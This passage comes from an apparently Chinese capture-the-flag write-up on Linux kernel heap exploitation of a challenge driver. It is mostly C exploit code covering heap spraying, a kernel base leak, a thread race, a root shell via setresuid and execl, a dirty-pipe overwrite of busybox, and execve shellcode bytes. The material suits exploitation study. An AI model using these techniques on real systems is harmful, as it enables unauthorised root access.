</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x28</span><span class="o">/</span><span class="mh">0x8</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">page_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span> <span class="o">||</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">p</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap error: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="nf">rdtsc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;delete_some_struct cost: %lld&#34;</span><span class="p">,</span><span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">[</span><span class="mh">0x2e0</span> <span class="o">+</span> <span class="mi">265</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x85</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">triger_vuln</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;triger_vuln&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">MMAP_ADDR</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">/</span><span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x1242e0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="nf">rdtsc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_sendmsg</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="nf">rdtsc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;triger vuln cost: %lld&#34;</span><span class="p">,</span><span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ffffffff811242e0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">exp</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pthread_t</span> <span class="n">t1</span><span class="p">,</span> <span class="n">t2</span><span class="p">,</span> <span class="n">t3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nf">punch_hole_prepare</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/hardker&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">keys</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">alloc_key</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xff00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_sendmsg</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="nf">get_key</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xff00</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">maybyKenrel</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">maybyKenrel</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff82428c09</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maybyKenrel</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff824569c0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maybyKenrel</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff82428e59</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maybyKenrel</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff829de42e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maybyKenrel</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff811ecc30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xff00</span><span class="o">/</span><span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">is_kernel_pointer</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// logi(&#34;kernel pointer: 0x%llx&#34;,data[i]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">((</span><span class="n">maybyKenrel</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;find kernel pointer: 0x%llx&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">maybyKenrel</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">goto</span> <span class="n">find_kernel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">find_kernel</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">kernel_base</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;kernel_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">loge</span><span class="p">(</span><span class="s">&#34;can&#39;t find kernel base&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mh">0x28</span><span class="o">/</span><span class="mh">0x8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">triger_punch</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t2</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">delete_some_struct</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t3</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">triger_vuln</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t2</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t3</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pipe_fd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pipe</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34;A&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//挂起子进程
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">pause</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//此时会阻塞，直到子进程发送数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s">&#34;cat&#34;</span><span class="p">,</span><span class="s">&#34;/flag&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// execl(&#34;/bin/sh&#34;,&#34;id&#34;,NULL);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="方法2">方法2</h5>
<ol>
<li>申请一个 0x200 大小的堆块</li>
<li>释放掉</li>
<li>使用 user_key_payload 占位</li>
<li>释放掉</li>
<li>使用 send_msg 占位 user_key_payload</li>
<li>更改 user_key_payload 的 data_len 为特别大的值泄露 kernel_base</li>
</ol>
<h4 id="kmalloc-cg-512">kmalloc-cg-512</h4>
<ol>
<li>申请一个 0x200 大小的堆块</li>
<li>释放掉</li>
<li>使用 sk_buffer 占用</li>
<li>释放掉</li>
<li>使用 pipe_buffer 占用 此时 sk_buffer 和 pipe_buffer 在同一个堆块</li>
<li>通过 sk_buffer 泄露 pipe_buffer 中的地址</li>
<li>重新申请，转化为 dirty_pipe 来写/bin/busybox 的 poweroff 函数</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_only</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_acc</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">list</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">char</span> <span class="n">attack_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">poc</span><span class="p">(){</span>
